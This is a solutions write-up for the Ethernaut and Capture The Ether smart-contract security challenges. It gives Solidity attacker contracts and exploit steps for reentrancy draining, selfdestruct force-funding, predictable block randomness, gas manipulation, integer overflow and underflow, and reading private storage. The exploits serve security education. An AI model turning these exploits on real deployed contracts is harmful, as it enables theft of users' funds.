# Smart contract security

Series of educational challenges

## Ethernaut 

### CoinFlip

We deploy the following attacker contract and we call the attack function on a sequence of ten consecutive blocks. 

```
pragma solidity 0.8.15;

contract CoinFlipAttacker {
    uint256 private immutable FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address target) public {
        bool guess = calculateGuess();
        target.call(abi.encodeWithSignature("flip(bool)", guess));
    }

    function calculateGuess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
```

Each time, the attack function will estimate the guess and send it to the CoinFlip contract

### Elevator

We deploy the following attacker contract and we call the attack function. 

```
pragma solidity 0.8.15;

import "../challenge/Elevator.sol";

contract ElevatorAttacker is Building {
    bool private set;
    
    function attack(address target) external {
        Elevator(target).goTo(0);
    }

    function isLastFloor(uint) external returns(bool) {
        bool setTop = set; 
        set = !set;
        return setTop;
    }
}
```

The isLastFloor() function will get called twice returning a different value in both cases

### Shop

We deploy the following attacker contract and we call the attack function. 

```
pragma solidity 0.8.15;

import "../challenge/Shop.sol";

contract ShopAttacker {
    uint256 private constant REQUIRE_PRICE = 100;
    uint256 private constant GAS_THRESHOLD = 28_096_381;

    function attack(address target) external {
        Shop(target).buy();
    }

    function price() external view returns (uint256) {
        uint256 gas = gasleft();
        if(gas >= GAS_THRESHOLD) {
            return 100;
        } else {
            return 0;
        }
    }
}
```

The price() function will get called twice returning a different price in both cases based on the gas left. The `GAS_THRESHOLD` was estimated based on the gas consumption of the call.

### Re-entrance

We deploy the following attacker contract and we call the attack function. 

```
pragma solidity 0.8.15;

contract ReentranceAttacker {
    function attack(address target) external payable {
        payable(target).call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        target.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
    }

    receive() external payable {
        if(msg.sender.balance > 0) {
            msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
        }
    }
}
```

When the receive() function gets called, we can re-enter and withdraw funds before our balance gets updated

### Token

We can call transfer() with an amount of 21 and generate an underflow.

### Force

We deploy the following attacker contract and we call the attack function. 

```
pragma solidity 0.8.15;

contract ForceAttacker {
    constructor() payable {}

    function attack(address target) external {
        selfdestruct(payable(target));
    }
}
```

By calling selfDestuct(), we make the Force contract to update its balance even without a fallback or receive function

### Naught Coin

The lockdown only applies to transfer() and not to the transferFrom() function of the ERC20 standard. We can approve ourselves and use transferFrom() to move the tokens

## Capture The Ether

### Guess the random number challenge

Storage slots are not private, we can observe what was stored in the first slot and use that value as the answer

### Guess the secret number challenge

As a uint8 was used, we know the value used previous to hashing is between 0-255. We can iterate and hash each number until we match the hash `0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365`

### Guess the new number challenge

We deploy the following attacker contract and we call the attack function. 

```
pragma solidity 0.4.21;

import "../challenge/GuessTheNewNumberChallenge.sol";
contract GuessTheNewNumberChallengeAttacker {
    function attack(address target) public payable {
        uint8 answer = calculateGuess();
        GuessTheNewNumberChallenge(target).guess.value(1 ether)(answer);
    }

    function calculateGuess() private view returns (uint8) {
        return uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function () external payable {}
}
```

We use the same estimations as the GuessTheNewNumberChallenge contract to calculate the guess.

### Predict the future challenge

We deploy the following attacker contract and we call the attack function. 

```
pragma solidity 0.4.21;

import "../challenge/PredictTheFutureChallenge.sol";
contract PredictTheFutureChallengeAttacker {
    PredictTheFutureChallenge private predictTheFutureChallenge;

    function PredictTheFutureChallengeAttacker(address target) public payable {
        predictTheFutureChallenge = PredictTheFutureChallenge(target);
        predictTheFutureChallenge.lockInGuess.value(1 ether)(0);
    }

    function attack() {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if(answer == 0) {
            predictTheFutureChallenge.settle();
        }
    }

    function () external payable {}
}
```

We call lockInGuess() with a value of 0, as we know that the value will be in between 0-9 we check block after block until we get the correct guess and call settle().

### Predict the block hash challenge

We lockInGuess() with a value of `0x00` and wait 256 blocks. After that, any blockhash older than that amount of blocks will return `0x00`

### Token Whale challenge

We deploy the following attacker contract and we call the attack function.

```
pragma solidity 0.4.21;

import "../challenge/TokenWhaleChallenge.sol";
contract TokenWhaleChallengeAttacker {
    function attack(address target) external {
        TokenWhaleChallenge(target).transferFrom(msg.sender, msg.sender, 1000);
        TokenWhaleChallenge(target).transfer(msg.sender, 10000000);
    }
}
```

We approve() the attacker contract address to manage the amount of funds and call attack() for that amount. The issue lies in the `_transfer()` function that updates the balance of the msg.sender and not the actual sender `from`

### Token Sale challenge

We can force an overflow by getting the following number after the multiplication overflow. Based on this, we calculate (MAX_UINT_256/1 ther) + 1. The overflow result value will be 415992086870360064 so we can send that as the msg.value. With this information we perform a buy() for the amount: (MAX_UINT_256/1 ther) + 1 and a msg.value of 415992086870360064. After that we do a sell(1) and as the recorded value is way higher of what we can withdraw with no issue.

### Retirement Fund challenge

We deploy the following attacker contract and we call the attack function

```
pragma solidity 0.4.21;

contract RetirementFundChallengeAttacker {
    function attack(address target) payable {
        selfdestruct(target);
    }
}
```

Using selfDestruct, we make sure the contract receives the funds even without having a fallback or receive function


